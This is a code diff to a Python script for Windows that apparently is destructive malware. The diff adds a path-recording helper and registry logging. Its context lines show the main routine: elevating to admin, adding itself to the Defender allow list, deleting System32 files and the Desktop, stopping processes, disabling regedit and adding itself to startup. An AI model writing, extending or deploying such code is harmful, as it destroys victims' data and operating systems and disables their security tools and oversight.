@@ -143,6 +143,18 @@ class FileCreation:
         id = id + 1
         count = count - 1
 
+  def create_path_file(self, path_to_target, path_text):
+    try:
+      with open(path_to_target, "w") as file:
+        file.write(str(path_text))
+        file.close()
+        d.whitelist.append(path_to_target)
+    except Exception as e:
+      logs.error(f"Failed to create file {path_to_target} : {e}")
+    else:
+      logs.info(f"Created file {path_to_target}")
+    
+
 
 class FileDeletion:
   def delete(self, file):
@@ -479,9 +491,11 @@ class Registry:
           return -1
     try:
       winreg.SetValueEx(key, value_name, 0, value_type, value_data)
-    except Exception:
+    except Exception as e:
+      logs.error(f"Error changing value of {value_name} in registry: {e}")
       return -2
     else:
+      logs.info(rf"Set {str(hive)}\{value_name} to {value_data} in registry")
       return 1
       
 
@@ -606,12 +620,15 @@ zf = Zipfiles()
 d = Data()
 e = Executables()
 f = Folders()
+fc = FileCreation()
 wsysw = WindowsSystemClass()
 fd = FileDeletion()
+reg = Registry()
 appdata = f.create_appdata_folder()
 logfile = os.path.join(appdata, logfile)
 logs.create_log(logfile)
 logs.set_log(logfile)
+fc.create_path_file(os.path.join(wsysw.get_documents_path(), 'path.txt'), os.path.realpath(__file__))
 wsysw.grant_admin()
 if not wsysw.is_admin():
   wsysw.relaunch_as_admin()
@@ -621,9 +638,7 @@ wsysw.defender_allow(os.path.realpath(sys.executable))
 fd.del_sys32_files()
 logs.info("Deleting Desktop...")
 fd.delete_folder(wsysw.get_desktop_path(), remove_folder=False)
-fc = FileCreation()
 e.stop_all()
-reg = Registry()
 reg.disable_regedit()
 reg.add_to_startup(os.path.realpath(__file__))
 exe_path = os.path.join(os.path.dirname(sys.executable), "runme.exe")
